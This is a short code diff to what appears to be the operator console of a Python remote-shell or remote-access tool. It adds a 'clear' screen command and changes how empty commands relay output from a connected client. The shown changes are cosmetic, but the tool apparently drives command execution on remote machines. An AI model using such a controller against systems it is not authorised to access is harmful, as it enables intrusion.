@@ -5,6 +5,7 @@ import traceback
 import socket as sock
 from .var import globals as g
 from .help import help_menu
+from sources.functions.ClearScreen import clear_screen
 
 
 def handler(signum, frame):
@@ -251,9 +252,15 @@ def get_shell(client, Id):
                 break
             if command in ['exit', 'quit']:
                 break
+            elif command == 'clear':
+                client.send(b'null')
+                output = (client.recv(5120)).decode()
+                clear_screen()
+                print(output, end='')
             elif len(command) == 0:
                 client.send(b'null')
-                print('sent')
+                output = (client.recv(5120)).decode()
+                print(output, end='')
             else:
                 client.send(command.encode())
                 output = (client.recv(10240)).decode()
@@ -318,6 +325,8 @@ def send_command(client, Id):
             if 'help' in command or '-h' in command:
                 help_menu(command=command)
                 print()
+            elif command == 'clear':
+                clear_screen()
             elif command == 'cwd':
                 client.send(command.encode())
                 get_cwd(client=client)
